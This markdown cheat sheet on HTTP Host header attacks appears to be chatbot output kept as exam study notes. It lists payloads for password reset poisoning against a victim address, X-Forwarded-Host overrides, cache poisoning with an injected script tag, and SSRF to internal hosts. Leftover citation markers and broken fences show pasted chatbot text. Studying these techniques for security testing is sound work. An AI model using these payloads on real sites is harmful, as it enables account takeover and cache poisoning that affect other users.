


---

``md
> [!ABSTRACT]
> HTTP Host Header vulnerabilities occur when an application **trusts the Host header** from user requests without proper validation.  
> 
> The Host header tells the server **which domain the client is requesting**, but attackers can modify it easily. :contentReference[oaicite:0]{index=0}  
> 
> If the server trusts it, attackers can:
> - Manipulate responses  
> - Poison caches  
> - Hijack password reset links  
> 
> It happens when:
> - Host header is used in logic (URLs, redirects, emails)  
> - No validation/whitelisting  
> 
> Impact:
> - Account takeover (password reset poisoning)  
> - Web cache poisoning  
> - SSRF / internal access  
> 
> 🧠 Think: “You’re lying about the domain—and the server believes you”

---

## 🧠 HTTP Host Header – Cheat Sheet

---

### 🎯 1. Basic Detection (Arbitrary Host)

> [!CHECK]
> Send request with fake Host  
> Check if app still responds normally  

```http
GET / HTTP/1.1
Host: attacker.com
````

---

### 🧪 2. Observe Response Behavior

> [!CHECK]  
> Look for reflection in:
> 
> - Redirects
>     
> - Links
>     
> - Emails
>     

```http
Host: attacker.com
```

---

### 🧬 3. Password Reset Poisoning

> [!SUCCESS]  
> Inject malicious domain into reset link

```http
POST /forgot-password
Host: attacker.com
email=victim@target.com
```

---

### 🧩 4. Host Header Injection (Multiple Headers)

> [!ATTENTION]  
> Try duplicate or override headers

```http
Host: target.com
Host: attacker.com
```

```http
X-Forwarded-Host: attacker.com
```

```http
X-Host: attacker.com
```

---

### 🧪 5. Open Redirect via Host

> [!SUCCESS]  
> Manipulate redirect location

```http
Host: attacker.com
```

---

### 💥 6. Web Cache Poisoning

> [!SUCCESS]  
> Inject malicious Host into cached response

```http
Host: attacker.com<script>alert(1)</script>
```

---

### ⚙️ 7. SSRF via Host Header

> [!SUCCESS]  
> Access internal services via routing

```http
Host: internal.local
```

---

### 🧪 8. Absolute URL Injection

> [!ATTENTION]  
> Use full URL instead of path

```http
GET http://attacker.com/ HTTP/1.1
Host: target.com
```

---

### 💣 9. Line Wrapping / Header Tricks

> [!ATTENTION]  
> Try malformed headers

```http
Host: attacker.com:80
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Intercept request
    
2. Modify Host:
    

```http
Host: attacker.com
```

3. Observe response:
    

- Redirects
    
- Links
    
- Email behavior
    

4. Try override headers:
    

```http
X-Forwarded-Host: attacker.com
```

5. Exploit:
    

- Password reset poisoning
    
- Cache poisoning
    

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- Password reset flows
    
- Redirects
    
- Email generation
    
- CDN / cache systems
    
- Reverse proxies
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
Host: internal.local
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Host validated (whitelisted)
>     
> - Headers ignored
>     
> - No dynamic usage
>     

---

> [!ATTENTION]  
> Host header attacks depend on:
> 
> - Trust in user-controlled header
>     
> - Backend using it in logic
>     
> 
> No trust → no vulnerability

---

```

---

## 🔥 Key Insight (important for you)

- This vuln is:
  - ❌ Not obvious  
  - ✅ Extremely powerful when found  
- Most common real-world exploit:
  👉 **Password reset poisoning** :contentReference[oaicite:1]{index=1}  

---
  

That combo = 🔥 elite level  

Just say 🚀
::contentReference[oaicite:2]{index=2}
```